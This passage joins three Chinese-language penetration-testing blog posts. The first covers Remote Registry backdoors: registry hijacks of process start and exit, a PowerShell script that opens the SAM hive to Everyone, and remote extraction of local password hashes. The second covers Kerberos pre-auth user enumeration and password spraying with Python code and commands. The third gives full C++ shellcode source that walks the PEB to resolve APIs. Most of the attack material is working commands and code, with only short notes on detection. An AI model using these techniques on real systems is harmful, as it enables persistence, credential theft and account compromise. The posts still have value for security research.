<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\calc.exe"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该方法学习自https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/</p>

<h3 id="2域环境">2、域环境</h3>

<p>域环境相比于工作组环境，存在一个可稳定的利用进程：taskhost.exe</p>

<p>默认情况下，域环境下的计算机组策略每90分钟更新，随机偏移为0-30分钟，域控制器的组策略每5分钟更新，组策略更新时会启动进程taskhost.exe</p>

<p>也可以强制刷新组策略：</p>

<h4 id="1已有域管理员权限刷新指定计算机的组策略">(1)已有域管理员权限，刷新指定计算机的组策略</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-GPUpdate -Computer "TEST\COMPUTER01"
</code></pre></div></div>

<h4 id="2刷新当前计算机的组策略可用于测试环境下该方法的验证">(2)刷新当前计算机的组策略，可用于测试环境下该方法的验证</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gpupdate /force
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>详细的利用测试可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8GPO%E4%B8%AD%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%89%A7%E8%A1%8C/">《域渗透——利用GPO中的计划任务实现远程执行》</a></p>

<p>劫持taskhost.exe进程的启动：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe" /v debugger /t REG_SZ /d "c:\windows\system32\calc.exe"
</code></pre></div></div>

<p>劫持taskhost.exe进程的结束：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskhost.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhost.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\taskhost.exe" /v MonitorProcess /t REG_SZ /d "c:\windows\system32\calc.exe"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>劫持taskhost.exe进程的结束时，如果选择calc.exe，会弹框提示，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/3-1.png" alt="Alt text"></p>

<h2 id="0x03-利用方法2获取sam文件中的用户hash">0x03 利用方法2：获取SAM文件中的用户hash</h2>
<hr>

<p>通过注册表的SAM文件，能够还原出当前系统的本地用户hash，详细方法可参考之前的文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%80%9A%E8%BF%87SAM%E6%95%B0%E6%8D%AE%E5%BA%93%E8%8E%B7%E5%BE%97%E6%9C%AC%E5%9C%B0%E7%94%A8%E6%88%B7hash/">《渗透技巧-通过SAM数据库获得本地用户hash》</a></p>

<p>简要流程如下：</p>

<ol>
  <li>读取注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</code>下的键值JD、Skew1、GBG和Data中的内容，拼接成syskey</li>
  <li>读取注册表项<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users</code>下每个用户中F项和V项的内容，使用syskey进行一系列的解密</li>
</ol>

<p>所以如果能够访问远程计算机的注册表文件，就能够还原出远程计算机所有本地用户的hash</p>

<p>在利用上需要注意<code class="language-plaintext highlighter-rouge">HKLM\SAM\SAM</code>的默认访问权限为<code class="language-plaintext highlighter-rouge">"NT AUTHORITY\SYSTEM"</code>(Administrator没有访问权限)，想要远程读取，还需要对这个注册表项及子项添加ACL</p>

<p>利用流程如下：</p>

<h3 id="1开启remote-registry服务-1">1、开启Remote Registry服务</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net start remoteregistry
</code></pre></div></div>

<h3 id="2添加aclaccess-control-list-1">2、添加ACL(Access Control List)</h3>

<p>注册表位置如下：</p>

<ul>
  <li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg</li>
  <li>HKEY_LOCAL_MACHINE\SAM\SAM及子项</li>
</ul>

<p>对以上注册表项添加用户Everyone的完全访问权限，powershell代码如下：
(在192.168.112.128上以System权限执行)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function Add-RegistryACL{
[CmdletBinding()]
Param (
[Parameter(Mandatory = $True)]
[String]
[ValidateNotNullOrEmpty()]
$Path
)
$acl = Get-Acl -Path $Path
$person = [System.Security.Principal.NTAccount]"Everyone"
$access = [System.Security.AccessControl.RegistryRights]"FullControl"
$inheritance = [System.Security.AccessControl.InheritanceFlags]"ObjectInherit,ContainerInherit"
$propagation = [System.Security.AccessControl.PropagationFlags]"None"
$type = [System.Security.AccessControl.AccessControlType]"Allow"
$rule = New-Object System.Security.AccessControl.RegistryAccessRule( `
$person,$access,$inheritance,$propagation,$type)
$acl.AddAccessRule($rule)
Set-Acl $Path $acl
}
Add-RegistryACL -Path 'HKLM:\SAM\SAM'
Add-RegistryACL -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg'
</code></pre></div></div>

<h3 id="3使用powershell解密还原远程计算机的本地用户hash">3、使用powershell解密还原远程计算机的本地用户hash</h3>

<p>使用以下脚本：</p>

<p>https://github.com/HarmJ0y/DAMP/blob/master/RemoteHashRetrieval.ps1</p>

<p>命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\RemoteHashRetrieval.ps1
Get-RemoteLocalAccountHash -ComputerName '192.168.112.128'
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-12-18/4-1.png" alt="Alt text"></p>

<p>成功获得192.168.112.128上的本地用户hash</p>

<h3 id="补充1">补充1：</h3>

<p>使用powershell解密还原本地所有用户的Hash，代码可参考：</p>

<p>https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-PowerDump.ps1</p>

<h3 id="补充2">补充2：</h3>

<p>针对域控制器，远程导出域控制器的本地用户hash，如果想要在域内使用pass the hash，还需要修改域控制器的注册表，允许DSRM账户远程访问：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add HKLM\System\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2
</code></pre></div></div>

<h2 id="0x04-防御检测的建议">0x04 防御检测的建议</h2>
<hr>

<p>防御：</p>

<ol>
  <li>如果不需要Remote Registry服务，建议禁用</li>
</ol>

<p>检测：</p>

<ol>
  <li>如果能够访问远程计算机的注册表文件，可供利用的方法还有很多，在检测上，可以对关键服务器的注册表操作进行监控</li>
</ol>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了Windows下的Remote Registry的两种后门利用方法：远程执行程序和获取SAM文件中的用户hash。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December 18, 2018
  </div>

  
</article><article class="post">
  <h1>渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在之前的文章《渗透基础——通过LDAP协议暴力破解域用户的口令》介绍了通过LDAP协议暴力破解域用户口令的方法，最大的特点是会产生日志(4625 - An account failed to log on)</p>

<p>而使用<a href="https://github.com/ropnop/kerbrute">kerbrute</a>通过Kerberos pre-auth进行暴力破解时不会产生日志(4625 - An account failed to log on)，于是我对<a href="https://github.com/ropnop/kerbrute">kerbrute</a>做了进一步的研究，使用python实现了相同的功能，并且添加支持TCP协议和NTLM hash的验证。本文将要记录自己的研究过程和学习心得。</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<ul>
  <li>kerbrute的介绍</li>
  <li>kerbrute的原理</li>
  <li>使用python实现kerbrute的细节</li>
  <li>开源代码pyKerbrute</li>
  <li>Kerberos pre-auth bruteforcing的检测</li>
</ul>

<h2 id="0x02-kerbrute的适用场景">0x02 kerbrute的适用场景</h2>
<hr>

<p>适用场景:从域外对域用户进行用户枚举和口令暴力破解</p>

<p>由于没有域用户的口令，所以无法通过LDAP协议枚举出所有域用户，而且使用LDAP协议进行暴力破解时会产生日志(4625 - An account failed to log on)</p>

<p>使用kerbrute有如下优点：</p>

<ul>
  <li>使用Kerberos pre-auth bruteforcing的速度更快</li>
  <li>不会产生日志(4625 - An account failed to log on)</li>
</ul>

<p><strong>注：</strong></p>

<p>Kerberos pre-auth对应的端口默认为88</p>

<h2 id="0x03-kerbrute测试">0x03 kerbrute测试</h2>
<hr>

<p>测试环境如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-12-12/3-1.png" alt="Alt text"></p>

<p>kerbrute使用Go语言开发，github提供了编译好的文件，地址如下：</p>

<p>https://github.com/ropnop/kerbrute/releases</p>

<p>kerbrute主要包括以下两个功能：</p>

<h3 id="1用户枚举">1.用户枚举</h3>

<p>用来验证用户是否存在，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute_windows_amd64.exe userenum --dc 192.168.1.1 -d test.com user.txt
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-1.png" alt="Alt text"></p>

<p>适用场景:</p>

<p>不掌握域用户的口令，所以无法通过LDAP协议枚举出所有域用户，可以使用这种方式来验证用户是否存在</p>

<h3 id="2口令验证">2.口令验证</h3>

<p>在确定了用户存在以后，可以使用这个功能来验证口令是否正确，命令如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kerbrute_windows_amd64.exe passwordspray -d test.com user.txt DomainUser123!
</code></pre></div></div>

<p>测试结果如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-2.png" alt="Alt text"></p>

<p>如果登录成功，会产生日志(4768 - A Kerberos authentication ticket (TGT) was requested)，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/2-3.png" alt="Alt text"></p>

<h2 id="0x04-使用python实现kerbrute的细节">0x04 使用python实现kerbrute的细节</h2>
<hr>

<p>我的想法是实现kerbrute的两个主要功能：用户枚举和口令验证</p>

<p>通过python实现kerberos协议的部分我参考了<a href="https://github.com/mubix/pykek">pykek</a></p>

<p>接下来通过抓包的方式获得kerbrute的数据包内容，然后通过python构造相同的数据包</p>

<p>kerbrute使用UDP协议实现Kerberos pre-auth，用来对明文口令进行验证</p>

<p>我在研究的过程中，发现通过TCP协议也能实现相同的功能，而且能够对NTLM hash进行验证</p>

<h3 id="1使用python实现用户枚举">1.使用python实现用户枚举</h3>

<p>使用wireshark抓取kerbrute用户枚举功能产生的数据包</p>

<p>使用UDP协议，用户枚举时发送的数据包内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-1.png" alt="Alt text"></p>

<p>如果用户存在，返回的数据包内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-2.png" alt="Alt text"></p>

<p>判断标志：<code class="language-plaintext highlighter-rouge">error-code: eRR-PREAUTH-REQUIRED (25)</code></p>

<p>如果用户不存在，返回的数据包内容如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-3.png" alt="Alt text"></p>

<p>判断标志：<code class="language-plaintext highlighter-rouge">error-code: eRR-C-PRINCIPAL-UNKNOWN (6)</code></p>

<p>接下来就是使用python实现发送UDP数据，发送的内容同kerbrute用户枚举时的数据包相同；接收返回内容，通过标志位来判断用户是否存在</p>

<p>通过TCP协议也能实现相同的功能，只是数据包格式不一样</p>

<p>TCP数据包前面要加一段字符串<code class="language-plaintext highlighter-rouge">pack('&gt;I', len(data))</code></p>

<p>具体的代码如下：</p>

<p>TCP：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_req_tcp(req, kdc, port=88):
    data = encode(req)
    data = pack('&gt;I', len(data)) + data
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_tcp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) &gt;= 4:
            if datalen is None:
                datalen = unpack('&gt;I', rep[:4])[0]
            if len(data) &gt;= 4 + datalen:
                sock.close()
                return data[4:4 + datalen]
</code></pre></div></div>

<p>UDP：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def send_req_udp(req, kdc, port=88):
    data = encode(req)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((kdc, port))
    sock.send(data)
    return sock

def recv_rep_udp(sock):
    data = ''
    datalen = None
    while True:
        rep = sock.recv(8192)
        if not rep:
            sock.close()
            raise IOError('Connection error')
        data += rep
        if len(rep) &gt;= 4:
            sock.close()
            return data
</code></pre></div></div>

<h3 id="2使用python实现口令验证">2.使用python实现口令验证</h3>

<p>使用wireshark抓取kerbrute口令验证功能产生的数据包</p>

<p>使用UDP协议，口令验证时发送的数据包内容如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-4.png" alt="Alt text"></p>

<p>相比用户枚举，在口令验证时多了一部分内容(padata)</p>

<p>具体差异如下：</p>

<p>用户枚举发送的数据包格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-5.png" alt="Alt text"></p>

<p>口令验证发送的数据包格式如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-6.png" alt="Alt text"></p>

<p>所以在实现上需要添加padata段的内容</p>

<p>如果口令正确，返回的数据包内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-7.png" alt="Alt text"></p>

<p>如果口令错误，返回的数据包内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/3-8.png" alt="Alt text"></p>

<p>具体的数据包结构可以参考RFC文档，地址如下：</p>

<p>https://tools.ietf.org/html/rfc1510#page-50</p>

<p>计算padata-value需要先将明文口令转换成NTLM hash再进行计算</p>

<p>所以说这个位置不仅可以使用明文口令，也可以使用NTLM hash</p>

<p>部分加密的python代码如下：</p>

<p>使用明文口令：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>clearpassword = DomainUser123!
user_key = (RC4_HMAC, ntlm_hash(clearpassword).digest())
pa_ts = build_pa_enc_timestamp(current_time, user_key)
as_req['padata'][0]['padata-value'] = encode(pa_ts)
</code></pre></div></div>

<p>使用NTLM hash：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntlmhash = e00045bd566a1b74386f5c1e3612921b
user_key = (RC4_HMAC, ntlmhash.decode('hex'))
pa_ts = build_pa_enc_timestamp(current_time, user_key)
as_req['padata'][0]['padata-value'] = encode(pa_ts)
</code></pre></div></div>

<h2 id="0x05-开源代码pykerbrute">0x05 开源代码pyKerbrute</h2>
<hr>

<p>完整的实现代码已上传至github，地址如下：</p>

<p>https://github.com/3gstudent/pyKerbrute</p>

<p>pyKerbrute是对kerbrute的python实现，相比于kerbrute，多了以下两个功能：</p>

<ul>
  <li>增加对TCP协议的支持</li>
  <li>增加对NTLM hash的验证</li>
</ul>

<p>pyKerbrute分为用户枚举和口令验证两个功能</p>

<h3 id="1enumaduserpy">1.EnumADUser.py</h3>

<p>用户枚举功能，支持TCP和UDP协议</p>

<p>命令实例：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>EnumADUser.py 192.168.1.1 test.com user.txt tcp
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-1.png" alt="Alt text"></p>

<h3 id="2adpwdspraypy">2.ADPwdSpray.py</h3>

<p>口令验证功能，支持TCP和UDP协议，支持明文口令和NTLM hash</p>

<p>命令实例1：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ADPwdSpray.py 192.168.1.1 test.com user.txt clearpassword DomainUser123! tcp
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-2.png" alt="Alt text"></p>

<p>命令实例2：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ADPwdSpray.py 192.168.1.1 test.com user.txt ntlmhash e00045bd566a1b74386f5c1e3612921b udp
</code></pre></div></div>

<p>结果输出如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2020-1-1/4-3.png" alt="Alt text"></p>

<h2 id="0x06-kerberos-pre-auth-bruteforcing的检测">0x06 Kerberos pre-auth bruteforcing的检测</h2>
<hr>

<p>Kerbrute使用Kerberos pre-auth协议，不会产生日志(4625 - An account failed to log on)</p>

<p>但是会产生以下日志：</p>

<ul>
  <li>口令验证成功时产生日志(4768 - A Kerberos authentication ticket (TGT) was requested)</li>
  <li>口令验证失败时产生日志(4771 - Kerberos pre-authentication failed)</li>
</ul>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对kerbrute进行了测试分析，使用python实现了相同的功能，并且添加支持TCP协议和NTLM hash的验证，开源代码，介绍脚本编写的细节，给出Kerberos pre-auth bruteforcing的检测方法。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on January  1, 2020
  </div>

  
</article><article class="post">
  <h1>Windows Shellcode学习笔记——shellcode的提取与测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>之前在<a href="https://3gstudent.github.io/3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E9%80%9A%E8%BF%87VisualStudio%E7%94%9F%E6%88%90shellcode/">《Windows Shellcode学习笔记——通过VisualStudio生成shellcode》</a>介绍了使用C++编写（不使用内联汇编），实现动态获取API地址并调用，对其反汇编提取shellcode的方法，并开源了测试代码。</p>

<p>接下来在对shellcode进行提取的过程中，发现了当时开源代码的一些bug，所以本文着重解决测试代码的bug，并介绍使用C++开发shellcode需要考虑的一些问题。</p>

<p>存在bug的测试代码下载地址：</p>

<p>https://github.com/3gstudent/Shellcode-Generater/blob/master/shellcode.cpp</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>简单的shellcode提取流程：</p>

<ul>
  <li>使用c++开发代码</li>
  <li>更改VisualStudio编译配置</li>
  <li>生成exe</li>
  <li>在IDA下打开生成的exe，获得机器码</li>
</ul>

<p>由于是动态获取API地址并调用，所以为了保证shellcode的兼容性，代码中不能出现固定地址，并且要尽量避免使用全局变量，如果代码中包含子函数，根据调用方式，还有注意各个函数之间的排列顺序（起始函数放于最前）</p>

<h2 id="0x02-bug修复">0x02 Bug修复</h2>
<hr>

<p>配置三个编译选项:release、禁用优化、禁用/GS</p>

<p>将代码编译，然后使用IDA提取机器码作为shellcode</p>

<p>在实际调试过程中，发现代码存在bug：</p>

<h3 id="1代码中应合理处理全局变量">1、代码中应合理处理全局变量</h3>

<p>在代码中使用全局变量</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);
HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);
</code></pre></div></div>

<p>在编译后会成为一个固定地址，导致shellcode无法兼容不同环境</p>

<p>最简单直接的方式是在shellcode中尽量避免全局变量</p>

<h3 id="2函数声明方式需要修改">2、函数声明方式需要修改</h3>

<p>修改全局变量后，以下代码需要修改：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MESSAGEBOXA_INITIALIZE MeassageboxA_MyOwn = reinterpret_cast&lt;MESSAGEBOXA_INITIALIZE&gt;(GetProcAddressAPI(LoadLibraryWAPI(struser32), MeassageboxA_api));
MeassageboxA_MyOwn(NULL, NULL, NULL, 0);
</code></pre></div></div>

<p>需要全部换成typedef的函数声明方式</p>

<h3 id="3函数调用顺序">3、函数调用顺序</h3>

<p>如果使用以下方式加载shellcode：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(*(int(*)()) sc)();	
</code></pre></div></div>

<p>起始函数的定义应该位于这段shellcode的最前面（和函数声明的顺序无关）</p>

<p><strong>注：</strong></p>

<p>shellcode如果包含子函数，应该保证各个函数放在一段连续的地址中，并且起始函数置于最前面，这样在提取机器码后，可以直接加载起始函数执行shellcode</p>

<p>综上，给出新的完整代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;windows.h&gt;
#include &lt;Winternl.h&gt;
#pragma optimize( "", off ) 
void shell_code();
HANDLE GetKernel32Handle();
BOOL __ISUPPER__(__in CHAR c);
CHAR __TOLOWER__(__in CHAR c);
UINT __STRLEN__(__in LPSTR lpStr1);
UINT __STRLENW__(__in LPWSTR lpStr1);
LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2);
INT __STRCMPI__(__in LPSTR lpStr1, __in LPSTR lpStr2);
INT __STRNCMPIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2, __in DWORD dwLen);
LPVOID __MEMCPY__(__in LPVOID lpDst, __in LPVOID lpSrc, __in DWORD dwCount);

typedef FARPROC(WINAPI* GetProcAddressAPI)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LoadLibraryWAPI)(LPCWSTR);
typedef ULONG (WINAPI *MESSAGEBOXAPI)(HWND, LPWSTR, LPWSTR, ULONG);


void shell_code() {

	LoadLibraryWAPI	loadlibrarywapi = 0;
	GetProcAddressAPI getprocaddressapi=0;
	MESSAGEBOXAPI messageboxapi=0;

	wchar_t struser32[] = { L'u', L's', L'e', L'r', L'3',L'2', L'.', L'd', L'l', L'l', 0 };
	char MeassageboxA_api[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };

	HANDLE hKernel32 = GetKernel32Handle();
	if (hKernel32 == INVALID_HANDLE_VALUE) {
		return;
	}
	LPBYTE lpBaseAddr = (LPBYTE)hKernel32;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpBaseAddr + lpDosHdr-&gt;e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(lpBaseAddr + pNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD)(lpBaseAddr + pExportDir-&gt;AddressOfFunctions);
	LPWORD pOrdArray = (LPWORD)(lpBaseAddr + pExportDir-&gt;AddressOfNameOrdinals);
	CHAR strLoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
	CHAR strGetProcAddress[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0x0 };

	for (UINT i = 0; i &lt; pExportDir-&gt;NumberOfNames; i++) {
		LPSTR pFuncName = (LPSTR)(lpBaseAddr + pNameArray[i]);
		if (!__STRCMPI__(pFuncName, strGetProcAddress)) {
			getprocaddressapi=(GetProcAddressAPI)(lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		else if (!__STRCMPI__(pFuncName, strLoadLibraryA)) {
			loadlibrarywapi=(LoadLibraryWAPI) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
		if (getprocaddressapi != nullptr &amp;&amp; loadlibrarywapi != nullptr) {				
			messageboxapi=(MESSAGEBOXAPI)getprocaddressapi(loadlibrarywapi(struser32), MeassageboxA_api);
			messageboxapi(NULL, NULL, NULL, 0);
			return;
		}
	}
}

inline BOOL __ISUPPER__(__in CHAR c) {
	return ('A' &lt;= c) &amp;&amp; (c &lt;= 'Z');
};
inline CHAR __TOLOWER__(__in CHAR c) {
	return __ISUPPER__(c) ? c - 'A' + 'a' : c;
};

UINT __STRLEN__(__in LPSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != 0x0)
		i++;
	return i;
}

UINT __STRLENW__(__in LPWSTR lpStr1)
{
	UINT i = 0;
	while (lpStr1[i] != L'\0')
		i++;
	return i;
}

LPWSTR __STRSTRIW__(__in LPWSTR lpStr1, __in LPWSTR lpStr2)
{
	CHAR c = __TOLOWER__(((PCHAR)(lpStr2++))[0]);
	if (!c)
		return lpStr1;
	UINT dwLen = __STRLENW__(lpStr2);
	do
	{
		CHAR sc;
		do
		{
			sc = __TOLOWER__(((PCHAR)(lpStr1)++)[0]);
			if (!sc)
				return NULL;
		} while (sc != c);
	} while (__STRNCMPIW__(lpStr1, lpStr2, dwLen) != 0);
	return (lpStr1 - 1); // FIXME -2 ?
}

INT __STRCMPI__(
	__in LPSTR lpStr1,
	__in LPSTR lpStr2)
{
	int  v;
	CHAR c1, c2;
	do
	{
		c1 = *lpStr1++;
		c2 = *lpStr2++;
		// The casts are necessary when pStr1 is shorter &amp; char is signed 
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) &amp;&amp; (c1 != '\0') &amp;&amp; (c2 != '\0'));
	return v;
}

INT __STRNCMPIW__(
	__in LPWSTR lpStr1,
	__in LPWSTR lpStr2,
	__in DWORD dwLen)
{
	int  v;
	CHAR c1, c2;
	do {
		dwLen--;
		c1 = ((PCHAR)lpStr1++)[0];
		c2 = ((PCHAR)lpStr2++)[0];
		/* The casts are necessary when pStr1 is shorter &amp; char is signed */
		v = (UINT)__TOLOWER__(c1) - (UINT)__TOLOWER__(c2);
	} while ((v == 0) &amp;&amp; (c1 != 0x0) &amp;&amp; (c2 != 0x0) &amp;&amp; dwLen &gt; 0);
	return v;
}

LPSTR __STRCAT__(
	__in LPSTR	strDest,
	__in LPSTR strSource)
{
	LPSTR d = strDest;
	LPSTR s = strSource;
	while (*d) d++;
	do { *d++ = *s++; } while (*s);
	*d = 0x0;
	return strDest;
}

LPVOID __MEMCPY__(
	__in LPVOID lpDst,
	__in LPVOID lpSrc,
	__in DWORD dwCount)
{
	LPBYTE s = (LPBYTE)lpSrc;
	LPBYTE d = (LPBYTE)lpDst;
	while (dwCount--)
		*d++ = *s++;
	return lpDst;
}

HANDLE GetKernel32Handle() {
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
#ifdef _WIN64
	PPEB lpPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB lpPeb = (PPEB)__readfsdword(0x30);
#endif
	PLIST_ENTRY pListHead = &amp;lpPeb-&gt;Ldr-&gt;InMemoryOrderModuleList;
	PLIST_ENTRY pListEntry = pListHead-&gt;Flink;
	WCHAR strDllName[MAX_PATH];
	WCHAR strKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', L'\0' };

	while (pListEntry != pListHead) {
		PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
		if (pModEntry-&gt;FullDllName.Length) {
			DWORD dwLen = pModEntry-&gt;FullDllName.Length;
			__MEMCPY__(strDllName, pModEntry-&gt;FullDllName.Buffer, dwLen);
			strDllName[dwLen / sizeof(WCHAR)] = L'\0';
			if (__STRSTRIW__(strDllName, strKernel32)) {
				hKernel32 = pModEntry-&gt;DllBase;
				break;
			}
		}
		pListEntry = pListEntry-&gt;Flink;
	}
	return hKernel32;
}

int main()
{
	printf("1");
	shell_code();
	printf("2");
	return 0;
}
</code></pre></div></div>

<h2 id="0x03-shellcode提取">0x03 Shellcode提取</h2>
<hr>

<p>将以上代码编译成exe后使用IDA打开，查看Function Window，找到各子函数起始地址</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-2-16/2-1.png" alt="Alt text"></p>

